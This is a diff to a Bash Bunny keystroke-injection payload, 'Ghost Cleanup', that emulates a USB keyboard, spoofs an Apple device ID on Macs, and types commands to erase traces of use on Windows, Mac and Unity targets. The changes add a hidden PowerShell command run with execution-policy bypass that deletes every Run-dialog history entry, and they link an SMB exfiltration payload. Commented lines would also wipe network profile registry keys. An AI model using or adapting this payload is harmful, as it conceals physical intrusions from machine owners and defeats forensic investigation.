@@ -3,13 +3,13 @@
 # Title:         Ghost Cleanup
 # Author:        bg-wa
 # Version:       0.1
-# Target:        Windows, Mac, Linux
-# Props:         Hak5 E2124 - https://www.youtube.com/watch?v=qGPGOoJn54E
+# Target:        Windows, Mac, Unity
+# Props:         Hak5
 #
-# Cleans the input history on Windows, Mac and Linux
+# Cleans the input history on Windows, Mac and Unity
 #
 
-
+LED R G
 
 #+++ CONFIG +++
 
@@ -66,7 +66,7 @@ init_keyboard()
         KEYBOARD="ATTACKMODE HID"
     else
         if [ "$1" = "MAC" ]; then
-            KEYBOARD="VID_0X05AC PID_0X021E"
+            KEYBOARD="ATTACKMODE HID VID_0X05AC PID_0X021E"
         else
             KEYBOARD="ATTACKMODE HID"
          fi
@@ -122,45 +122,14 @@ clear_history_from_terminal()
 clear_history_from_powershell()
 {
     if [ "$LINES" -gt "0" ]; then
-#        QUACK STRING setlocal enableextensions enabledelayedexpansion
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        QUACK STRING set len="${LINES}"
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        QUACK STRING set /a len_pos=%len%-1
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        QUACK STRING for /f "tokens=2*" %%a in ('reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v MRUList') do set "mru=%%b"
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        QUACK STRING for /f %%c in ('cmd /u /v /q /c"(echo(!mru!)" ^| find /v "" ^| findstr /r /c:"[a-z]" ^| find /c /v ""') do set "str_len=%%c"
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        # Get the last Nr of defined lines from MRUList
-#        QUACK STRING set list=!mru:~0,%len%!
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        # Set the new MRUList
-#        QUACK STRING set original_list=!mru:~%len%,%str_len%!
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        # Delete old MRUList
-#        QUACK STRING reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /f
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        # Add new MRUList
-#        QUACK STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /t Reg_Sz /d %original_list%
-#        QUACK ENTER
-#        QUACK DELAY 200
-#        # Delete the last Nr of lines from Registry
-#        QUACK STRING for /l %%d in (0,1,%len_pos%) do (reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v !list:~%%d,1! /f)
-#        QUACK ENTER
-#        QUACK DELAY 200
-        1=1
+        # TODO: THIS CURRENTLY DELETES ALL HISTORY, IT SHOULD JUST REMOVE THE SPECIFIED NUMBER OF LINES
+        # https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/smb_exfiltrator/payload.txt
+         QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+         wait_enter_wait
     else
-        QUACK STRING reg delete \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\" /v /f
-        wait_enter_wait
+    # https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/smb_exfiltrator/payload.txt
+     QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+     wait_enter_wait
     fi
     echo "HISTORY CLEARED FROM POWERSHELL" >> "${DEBUG_FILE}"
 }
@@ -176,18 +145,11 @@ remove_windows_network_adapters()
 {
     1=1
     # QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
-    # QUACK ENTER
-    # QUACK DELAY 100
 
     # REMOVE EXTRA ETHERNET CONNECTIONS
     # QUACK STRING netsh show profiles
-    # QUACK ENTER
-    # QUACK DELAY 100
     # todo ADAPTER=Get last ethernet adapter
-    # QUACK ENTER
     # QUACK STRING netsh delete profile interface= $ADAPTER
-    # QUACK ENTER
-    # QUACK DELAY 100
 }
 
 echo "FUNCTIONS LOADED" >> "${DEBUG_FILE}"
@@ -195,11 +157,7 @@ echo "FUNCTIONS LOADED" >> "${DEBUG_FILE}"
 
 
 
-
-
 # START CLEANUP
-LED R
-
 #UNITY
 if [ "${OS}" = "UNITY" ]; then
     LED R B 100
@@ -241,9 +199,7 @@ if [ "${OS}" = "WINDOWS" ]; then
     init_keyboard
     LED B 100
     QUACK GUI r
-    clear_active_input
-    QUACK STRING powershell
-    wait_enter_wait 200 1000
+    QUACK DELAY 500
 
     #++ INSERT CUSTOM WINDOWS CLEANUP HERE ++
 
@@ -252,6 +208,7 @@ if [ "${OS}" = "WINDOWS" ]; then
 
     clear_history_from_powershell
 fi
+
 
 QUACK STRING exit
 wait_enter_wait
